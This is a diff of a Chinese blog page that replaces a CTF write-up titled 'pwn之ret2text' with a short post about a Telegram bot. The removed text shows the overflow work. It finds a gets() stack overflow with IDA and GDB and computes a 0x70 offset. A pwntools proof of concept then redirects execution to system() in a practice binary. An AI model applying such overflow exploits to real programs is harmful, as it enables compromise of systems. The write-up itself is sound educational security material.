@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="YLL">
   <meta name="keywords" content="">
-  <title>pwn之ret2text - YLL-F11</title>
+  <title>简单的Telegram机器人 - YLL-F11</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 
@@ -165,8 +165,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2020-09-10 11:02" pubdate>
-        2020年9月10日 上午
+      <time datetime="2020-09-20 18:55" pubdate>
+        2020年9月20日 晚上
       </time>
     </span>
   
@@ -177,7 +177,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      474 字
+      69 字
     </span>
   
 
@@ -187,7 +187,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      5
+      1
        分钟
     </span>
   
@@ -217,29 +217,13 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto" id="post">
             <!-- SEO header -->
-            <h1 style="display: none">pwn之ret2text</h1>
+            <h1 style="display: none">简单的Telegram机器人</h1>
             
             <div class="markdown-body" id="post-body">
-              <h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p>题目下载<a target="_blank" rel="noopener" href="https://github.com/YLL-F1/pwn/raw/master/ret2text">下载地址</a></p>
-<h3 id="web狗的转型之路"><a href="#web狗的转型之路" class="headerlink" title="web狗的转型之路"></a>web狗的转型之路</h3><p>before long history。。。。。。之前，一直在web层的安全进行专研，偶然一次接触pwn题，感觉在安全路上又找到了一个新的起点。接下来也会慢慢步入pwn中，了解二进制中的安全。</p>
-<h2 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h2><h3 id="准备工具"><a href="#准备工具" class="headerlink" title="准备工具"></a>准备工具</h3><ul>
-<li><font color=red>gdb:</font> linux下的动态调试工具。  </li>
-<li><font color=red>ida:</font> 方便windows下静态查看的反编译工具。  </li>
-</ul>
-<h3 id="题目大概"><a href="#题目大概" class="headerlink" title="题目大概"></a>题目大概</h3><p><img src="/images/ret2text/6.png" srcset="/img/loading.gif"><br>初步运行该文件，发现该文件功能大致为输入，输出。<br><img src="/images/ret2text/1.png" srcset="/img/loading.gif"><br>IDA还原C代码，可以发现主函数使用gets()进行输入，printf()进行输出。 </p>
-<h3 id="概要分析"><a href="#概要分析" class="headerlink" title="概要分析"></a>概要分析</h3><p><img src="/images/ret2text/2.png" srcset="/img/loading.gif"> </p>
-<p><img src="/images/ret2text/5.png" srcset="/img/loading.gif"><br>IDA分析发现的看到两个关键点分别为gets()，system()。正常运行题目文件会在输入参数后跳转到printf()函数，是无法跳转到system函数。所以，我们要利用C语言中的gets()函数存在溢出漏洞进行填充溢出至system()函数地址```0x0804863A``，去执行system()函数。</p>
-<h3 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h3><p>ida静态分析，定位到gets()函数地址。F5还原C代码，ida显示s到ebp的偏移为64h，但ida的静态分析可能存在不准确信，所有再用gdb动态进行分析确定。<br>使用GDB在gets()函数地址080486AE下断点 <code>b *0x080486AE</code><br>输入<code>r</code>运行<br><img src="/images/ret2text/3.png" srcset="/img/loading.gif"><br>变量s到EBP的偏移为|0x0ffffcfd8-0xffffcf6c|=0x6C，所以s相对与返回地址的偏移为0x6c+4=0x70，所以ida的偏移64h还是存在偏差。所以溢出偏移量为0x6C+0x04(return地址)=0x70。</p>
-<h3 id="GDB-pattern计算偏移量"><a href="#GDB-pattern计算偏移量" class="headerlink" title="GDB pattern计算偏移量"></a>GDB pattern计算偏移量</h3><p><img src="/images/ret2text/7.png" srcset="/img/loading.gif"><br>在get()函数的下一个地址下断点，进入输入参数阶段。<br><img src="/images/ret2text/9.png" srcset="/img/loading.gif"><br>使用<code>pattern_create 200</code>生成随机200个字符，来进行溢出输入。<br><img src="/images/ret2text/10.png" srcset="/img/loading.gif">  </p>
-<p><img src="/images/ret2text/11.png" srcset="/img/loading.gif"><br>使用GDB pattern通过溢出的地址计算出偏移量为112=0x70。</p>
-<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre><code class="hljs aidl">from pwn import *
-
-sh &#x3D; process(&quot;.&#x2F;ret2text&quot;)
-binsh_addr &#x3D; 0x0804863a
-payload &#x3D; flat([&quot;A&quot; * 0x70, binsh_addr])
-sh.sendline(payload)
-sh.interactive()</code></pre>
-<p>编写POC，成功调用system函数。<br><img src="/images/ret2text/12.png" srcset="/img/loading.gif">  </p>
+              <h2 id="Telegram"><a href="#Telegram" class="headerlink" title="Telegram"></a>Telegram</h2><p>闲来无事！！！！，做了一个简单的Telegram BOT!<br>机器人订阅ID<br>@yll1122_bot</p>
+<h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p>该机器人目前支持一些简单的加解密功能，还有数字货币买入卖出点的简单计算功能。</p>
+<p><img src="/images/telegram/1.png" srcset="/img/loading.gif"></p>
+<h3 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h3><p><a target="_blank" rel="noopener" href="https://github.com/YLL-F1/telegram_bot">https://github.com/YLL-F1/telegram_bot</a></p>
 
             </div>
             <hr>
@@ -256,18 +240,12 @@ sh.interactive()</code></pre>
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2020/09/20/%E7%AE%80%E5%8D%95%E7%9A%84Telegram%E6%9C%BA%E5%99%A8%E4%BA%BA/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">简单的Telegram机器人</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2020/08/31/%E6%9F%90X%E6%9C%8D%E5%AE%A1%E8%AE%A1/">
-                        <span class="hidden-mobile">某X服EDR审计</span>
+                      <a href="/2020/09/10/pwn%E4%B9%8Bret2text/">
+                        <span class="hidden-mobile">pwn之ret2text</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -417,7 +395,7 @@ sh.interactive()</code></pre>
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "pwn之ret2text&nbsp;",
+        "简单的Telegram机器人&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
